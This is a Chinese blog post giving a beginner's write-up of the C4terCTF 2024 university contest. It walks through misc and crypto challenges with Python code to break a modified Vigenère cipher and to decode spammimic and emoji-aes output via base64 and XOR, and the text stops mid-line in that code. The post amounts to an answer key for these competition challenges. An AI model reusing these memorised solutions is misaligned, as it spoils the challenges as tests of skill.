<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/icons8-%E6%BA%90%E4%BB%A3%E7%A0%81-32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/icons8-%E6%BA%90%E4%BB%A3%E7%A0%81-16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="中山大学2024 CTF校赛">
<meta property="og:type" content="article">
<meta property="og:title" content="C4terCTF 2024">
<meta property="og:url" content="http://example.com/2024/04/30/writeup/index.html">
<meta property="og:site_name" content="doovvv">
<meta property="og:description" content="中山大学2024 CTF校赛">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2024/04/30/writeup/image-20240429002836067.png">
<meta property="og:image" content="http://example.com/2024/04/30/writeup/image-20240429003321769.png">
<meta property="og:image" content="http://example.com/2024/04/30/writeup/image-20240429004438198.png">
<meta property="og:image" content="http://example.com/2024/04/30/writeup/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-28%20202602.png">
<meta property="og:image" content="http://example.com/2024/04/30/writeup/image-20240429014104492.png">
<meta property="og:image" content="http://example.com/2024/04/30/writeup/image-20240429014202401.png">
<meta property="og:image" content="http://example.com/2024/04/30/writeup/image-20240429014620062.png">
<meta property="article:published_time" content="2024-04-30T12:14:48.000Z">
<meta property="article:modified_time" content="2024-05-10T02:08:44.267Z">
<meta property="article:author" content="doovvv">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/04/30/writeup/image-20240429002836067.png">

<link rel="canonical" href="http://example.com/2024/04/30/writeup/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>C4terCTF 2024 | doovvv</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">doovvv</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/30/writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="doovvv">
      <meta itemprop="description" content="一切都没有意外，只是多了些波折">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="doovvv">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          C4terCTF 2024
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-04-30 20:14:48" itemprop="dateCreated datePublished" datetime="2024-04-30T20:14:48+08:00">2024-04-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-05-10 10:08:44" itemprop="dateModified" datetime="2024-05-10T10:08:44+08:00">2024-05-10</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2024/04/30/writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2024/04/30/writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>中山大学2024 CTF校赛 <span id="more"></span> # writeup</p>
<blockquote>
<p>零基础，可能某些描述比较奇怪</p>
</blockquote>
<h2 id="sign-in">Sign In</h2>
<p>根据题面在排行榜中找到W4terDr0p战队，flag在个性签名处 找到flag</p>
<h2 id="broken.mp4">broken.mp4</h2>
<p>根据第一个视频，在微信中搜索找到这篇文章，找到视频修复软件，根据文章指示修复另一个损坏的视频。修复之后发现flag在视频中。</p>
<h2 id="remember-it-0">Remember It 0</h2>
<p>利用手机录像记住十次字符串，得到flag</p>
<h2 id="shuffle-puts">Shuffle Puts</h2>
<p>用记事本打开即可找到flag</p>
<h2 id="revenge-of-vigenere">Revenge of Vigenere</h2>
<p>首先遍历密钥长度从[10-20),根据密钥给密文分组，对每组遍历26个字母，假设该字母是密钥的基础上推出明文，计算出该组与自然英文的重合指数，选择重合指数最大的一个字母作为密钥。</p>
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字母表</span></span><br><span class="line">ALPHABET = string.ascii_uppercase</span><br><span class="line">ALPHABET_LEN = <span class="built_in">len</span>(ALPHABET)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 频率分析</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_letter_frequency</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="comment"># 计算字母频率</span></span><br><span class="line">    counts = Counter(char.upper() <span class="keyword">for</span> char <span class="keyword">in</span> text <span class="keyword">if</span> char.isalpha())</span><br><span class="line">    total = <span class="built_in">sum</span>(counts.values())</span><br><span class="line">    <span class="keyword">return</span> &#123;char: count / total <span class="keyword">for</span> char, count <span class="keyword">in</span> counts.items()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_vigenere</span>(<span class="params">ciphertext, key,key_length,shift_key</span>):</span><br><span class="line">    plaintext = []</span><br><span class="line">    <span class="comment">#key_cycle = cycle(key)  # 密钥循环</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="comment">#key_char = next(key_cycle).upper()</span></span><br><span class="line">            shift = <span class="built_in">ord</span>(key.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)  <span class="comment"># 计算偏移量</span></span><br><span class="line">            <span class="keyword">if</span> (key_length*count+shift_key+<span class="number">1</span>) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - base - shift*(key_length*count+shift_key)) % <span class="number">26</span> + base)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - base + shift*(key_length*count+shift_key)) % <span class="number">26</span> + base)</span><br><span class="line">            plaintext.append(decrypted_char)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext.append(char)  <span class="comment"># 非字母字符保持不变</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推测密钥长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">estimate_key_length</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="comment"># Kasiski 检验：寻找重复片段及其距离</span></span><br><span class="line">    min_key_length = <span class="number">1</span></span><br><span class="line">    max_key_length = <span class="number">20</span>  <span class="comment"># 假设最大密钥长度</span></span><br><span class="line">    distances = []</span><br><span class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> <span class="built_in">range</span>(min_key_length, max_key_length + <span class="number">1</span>):</span><br><span class="line">        groups = [ciphertext[i::key_length] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_length)]</span><br><span class="line">        coincidences = [get_letter_frequency(group) <span class="keyword">for</span> group <span class="keyword">in</span> groups]</span><br><span class="line">        ic_values = [<span class="built_in">sum</span>(count * (count - <span class="number">1</span>) <span class="keyword">for</span> count <span class="keyword">in</span> Counter(group).values()) <span class="keyword">for</span> group <span class="keyword">in</span> groups]</span><br><span class="line">        distances.append(<span class="built_in">sum</span>(ic_values) / <span class="built_in">len</span>(ic_values))</span><br><span class="line">    <span class="comment"># 选择具有最高 IC 的密钥长度</span></span><br><span class="line">    <span class="keyword">return</span> distances.index(<span class="built_in">max</span>(distances)) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 推测密钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_key</span>(<span class="params">ciphertext, key_length</span>):</span><br><span class="line">    groups = [ciphertext[i::key_length] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_length)]</span><br><span class="line">    <span class="comment">#print(groups)</span></span><br><span class="line">    english_letter_frequencies = &#123;</span><br><span class="line"><span class="string">&quot;E&quot;</span>: <span class="number">0.12702</span>, <span class="string">&quot;T&quot;</span>: <span class="number">0.09056</span>, <span class="string">&quot;A&quot;</span>: <span class="number">0.08167</span>, <span class="string">&quot;O&quot;</span>: <span class="number">0.07507</span>, <span class="string">&quot;I&quot;</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">&quot;N&quot;</span>: <span class="number">0.06749</span>, <span class="string">&quot;S&quot;</span>: <span class="number">0.06327</span>, <span class="string">&quot;H&quot;</span>: <span class="number">0.06094</span>, <span class="string">&quot;R&quot;</span>: <span class="number">0.05987</span>, <span class="string">&quot;D&quot;</span>: <span class="number">0.04253</span>,</span><br><span class="line">                   <span class="string">&quot;L&quot;</span>: <span class="number">0.04025</span>, <span class="string">&quot;C&quot;</span>: <span class="number">0.02782</span>, <span class="string">&quot;U&quot;</span>: <span class="number">0.02758</span>, <span class="string">&quot;M&quot;</span>: <span class="number">0.02406</span>, <span class="string">&quot;W&quot;</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">&quot;F&quot;</span>: <span class="number">0.02228</span>, <span class="string">&quot;G&quot;</span>: <span class="number">0.02015</span>, <span class="string">&quot;Y&quot;</span>: <span class="number">0.01974</span>, <span class="string">&quot;P&quot;</span>: <span class="number">0.01929</span>, <span class="string">&quot;B&quot;</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">&quot;V&quot;</span>: <span class="number">0.00978</span>, <span class="string">&quot;K&quot;</span>: <span class="number">0.00772</span>, <span class="string">&quot;J&quot;</span>: <span class="number">0.00153</span>, <span class="string">&quot;X&quot;</span>: <span class="number">0.00150</span>, <span class="string">&quot;Q&quot;</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">&quot;Z&quot;</span>: <span class="number">0.00074</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 推测每组的可能偏移量</span></span><br><span class="line">    key = []</span><br><span class="line">    count_key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> group <span class="keyword">in</span> groups:</span><br><span class="line">        best_shift = <span class="literal">None</span></span><br><span class="line">        best_score = <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(ALPHABET_LEN):</span><br><span class="line">            decrypted = decrypt_vigenere(group, ALPHABET[shift],key_length,count_key)</span><br><span class="line">            freq = get_letter_frequency(decrypted)</span><br><span class="line">            <span class="comment">#if shift == 25:</span></span><br><span class="line">                <span class="comment">#print(freq)</span></span><br><span class="line">                <span class="comment">#print(decrypted)</span></span><br><span class="line">            <span class="comment"># 计算与英语字母频率的距离</span></span><br><span class="line">            score = <span class="built_in">sum</span>(freq.get(char, <span class="number">0</span>) * english_letter_frequencies.get(char, <span class="number">0</span>) <span class="keyword">for</span> char <span class="keyword">in</span> ALPHABET)</span><br><span class="line">            <span class="comment">#if shift == 0:</span></span><br><span class="line">                <span class="comment">#print(score)</span></span><br><span class="line">            <span class="keyword">if</span> score &gt; best_score:</span><br><span class="line">                best_score = score</span><br><span class="line">                best_shift = ALPHABET[shift]</span><br><span class="line">        <span class="comment">#print(best_shift)</span></span><br><span class="line">        key.append(best_shift)</span><br><span class="line">        count_key+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(key)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext,key</span>):</span><br><span class="line">    key_index = <span class="number">0</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    text_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            key_char = key[key_index % key_length].upper()</span><br><span class="line">            key_offset = <span class="built_in">ord</span>(key_char) - <span class="number">65</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> char.isupper():</span><br><span class="line">                base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                base = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (text_index + <span class="number">1</span>) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                plain_char = <span class="built_in">chr</span>(</span><br><span class="line">                    (<span class="built_in">ord</span>(char) - base - text_index * key_offset) % <span class="number">26</span> + base)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                plain_char = <span class="built_in">chr</span>(</span><br><span class="line">                    (<span class="built_in">ord</span>(char) - base + text_index * key_offset) % <span class="number">26</span> + base)</span><br><span class="line"></span><br><span class="line">            plaintext += plain_char</span><br><span class="line">            key_index += <span class="number">1</span></span><br><span class="line">            text_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"><span class="comment"># 示例密文</span></span><br><span class="line">ciphertext = <span class="string">&quot;Vbkwz! Xp ggdw, c jhaetd bpcselmyldow fxljret, pmfn owzcmigcfjd av tpfs vomgsj gaz aemluua xn fee eotiagvbbvlw bv Mapu. Gbhq Mqjade, xg zkii Wqiorr mz Iswseo, hm lt Hafxjwz ii xae Vmk fhlzjp, bxw Japcyv, Kcygrhgf, ng wpd uckt Vyxnl Qcrmx gk tlk Iqeclwjkgilcqc soz Nfzprgdrc tnnp ydfy izpa Kuiioovd. Pcjmcwy, xuyz Vwbblnsj Dzsftklvue sg m wi-toly Iwgkeynh, vtmjqw Wyqcimxd, alq xto Amdsm tc Vnpbwxus rgeug Isqik gcl Kihyyeih Eokenn zgashukr-fpb Vakr ysd Ygvossgpvxd zua Aeplyzghn Hfcruls ibq Dvjhgvebs Rybfzrzwe oc Vydvzzso. Mhsqsr nuab Fzhsya or Rrvcencwc, t Vegyuw Rjqawpe cf Ikyfxelrhop gzsuody: p Dpryeolz K4cokUYF&#123;83rKnfU_Nas_jCNk_NQtCSeUW_57S1wps_8GMX_Gf7N_iaS9AbNWQ&#125;, lai Hfvjizocg Imjlvv sey Vesgiqw. Kpv okli Nrxumdf dc Ielarswmp; q Uyqdqpge, iugx dw t Vorvlx, jtr pb Eawn, sqc vwg Gykug car Ymqgrqiy ej fuxv brtdq ork qml Pbbakxalm gfj Vlyjxlnz kan qnr Rnnuuigf. Rtdflh, zyia Jvkoqzwbyze kv Iyqzzixe Seojf sfwu Hzbooqy, lwc gtjgcq ifo Ismkhyv pbes ruu Oegphbc Vcipg zh Kcwgcavkbb. Lv snxa Keyr, vt dg vi Owwy kubp uigco vj mwmg wtu dfe kzu skl mxry ij R.&quot;</span>  <span class="comment"># 替换为实际密文</span></span><br><span class="line">temp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    <span class="keyword">if</span> ciphertext[i].isalpha():</span><br><span class="line">        temp+= ciphertext[i]</span><br><span class="line"><span class="comment"># 估计密钥长度</span></span><br><span class="line"><span class="comment">#key_length = estimate_key_length(ciphertext)</span></span><br><span class="line"><span class="keyword">for</span> key_length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line"><span class="comment"># 推测密钥</span></span><br><span class="line">    key = guess_key(temp, key_length)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    decrypted_text = decrypt(ciphertext, key)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Estimated Key Length:&quot;</span>, key_length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Estimated Key:&quot;</span>, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted Text:&quot;</span>, decrypted_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行之后，发现密钥长度12时出现flag</p>
<figure>
<img src="/2024/04/30/writeup/image-20240429002836067.png" alt="image-20240429002836067">
<figcaption aria-hidden="true">image-20240429002836067</figcaption>
</figure>
<h2 id="spam-2024">Spam 2024</h2>
<p>在<a target="_blank" rel="noopener" href="https://www.spammimic.com/">spammimic - hide a message in
spam</a>中解码该垃圾邮件，得到一串十六进制，用python解码一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">emoji_hex_string = <span class="string">&quot;59,6f,75,20,6c,69,6b,65,20,65,6d,6f,6a,69,73,2c,20,64,6f,6e,27,74,20,79,6f,75,3f,0a,0a,01f643,01f4b5,01f33f,01f3a4,01f6aa,01f30f,01f40e,01f94b,01f6ab,01f606,2705,01f606,01f6b0,01f4c2,01f32a,263a,01f6e9,01f30f,01f4c2,01f579,01f993,01f405,01f375,01f388,01f600,01f504,01f6ab,01f3a4,01f993,2705,01f4ee,01f3a4,01f385,01f34e,01f643,01f309,01f383,01f34d,01f374,01f463,01f6b9,01f923,01f418,01f3f9,263a,01f463,01f4a7,01f463,01f993,01f33f,2328,01f32a,01f30f,01f643,01f375,2753,2602,01f309,01f606,01f3f9,01f375,01f4a7,01f385,01f449,01f30a,01f6b9,01f6aa,01f374,01f60e,01f383,01f32a,01f643,01f441,01f94b,01f451,01f4a7,01f418,01f3a4,01f94b,01f418,01f6e9,01f923,01f309,01f6e9,23e9,01f60d,2753,01f418,01f621,2600,01f60d,01f643,01f601,01f600,01f601,01f6ab,01f4c2,2705,2603,01f6ab,01f60e,01f52a,01f451,01f600,01f579,01f6ab,01f60d,01f32a,01f4c2,01f44c,01f34d,01f44c,01f993,01f590,01f923,01f60e,01f3ce,01f34d,01f3f9,01f34c,01f34d,01f3a4,2600,01f3f9,01f388,01f6b0,01f4a7,2600,2709,01f3f9,01f34d,01f993,01f385,01f374,2602,23e9,01f6aa,01f40d,263a,01f418,01f607,01f621,01f375,01f30f,01f993,01f375,01f6e9,01f4c2,01f44c,01f3f9,01f5d2,01f5d2,0a,0a,42,74,77,2c,20,74,68,65,20,6b,65,79,20,69,73,20,22,4b,45,59,22&quot;</span></span><br><span class="line">emoji_values = emoji_hex_string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">emoji_text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> emoji_values:</span><br><span class="line">    emoji_text += (<span class="built_in">chr</span>(<span class="built_in">int</span>(i.strip(), <span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(emoji_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到如下图所示的结果：</p>
<figure>
<img src="/2024/04/30/writeup/image-20240429003321769.png" alt="image-20240429003321769">
<figcaption aria-hidden="true">image-20240429003321769</figcaption>
</figure>
<p>将这一串emoji放到<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/">emoji-aes
(aghorler.github.io)</a>中解码，猜测密钥为”KEY“，不正确。猜测密钥为🔑，解码结果如下为：0x????
⊕
dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=。</p>
<p>由等号猜测后面部分为base64编码，解码之后由⊕猜测需要与一个十六进制数进行异或。忙猜0x2024，得到flag。</p>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 输入的Base64字符串</span><br><span class="line">encoded_str = &quot;dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=&quot;</span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"></span><br><span class="line"># 异或密钥（4字节）</span><br><span class="line">xor_key = b&#x27;\x20\x24&#x27;  # 你可以使用不同的密钥</span><br><span class="line"></span><br><span class="line"># 初始化结果字节数组</span><br><span class="line">result_bytes = bytearray()</span><br><span class="line"></span><br><span class="line"># 每4个字节进行异或</span><br><span class="line">chunk_size = 2</span><br><span class="line">for i in range(0, len(decoded_bytes), chunk_size):</span><br><span class="line">    # 获取4字节块</span><br><span class="line">    chunk = decoded_bytes[i:i + chunk_size]</span><br><span class="line"></span><br><span class="line">    # 如果块大小小于4字节，需要填充到4字节</span><br><span class="line">    #if len(chunk) &lt; chunk_size:</span><br><span class="line">       # chunk = chunk.ljust(chunk_size, b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">    # 进行异或操作</span><br><span class="line">    xored_chunk = bytes([chunk[j] ^ 